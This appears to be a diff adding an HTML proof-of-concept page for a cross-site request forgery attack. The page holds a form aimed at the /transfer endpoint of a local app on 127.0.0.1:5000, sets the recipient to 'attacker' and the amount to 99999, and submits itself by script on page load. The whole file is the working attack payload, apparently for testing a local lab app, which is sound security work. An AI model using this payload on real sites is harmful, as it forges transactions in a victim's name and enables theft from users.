@@ -1,0 +1,11 @@
+<!doctype html>
+<html><body>
+<h3>CSRF PoC</h3>
+<form action="http://127.0.0.1:5000/transfer" method="POST" id="f">
+  <input name="recipient" value="attacker">
+  <input name="amount" value="99999">
+  <input name="method" value="AES">
+  <input name="message" value="csrf-transfer">
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
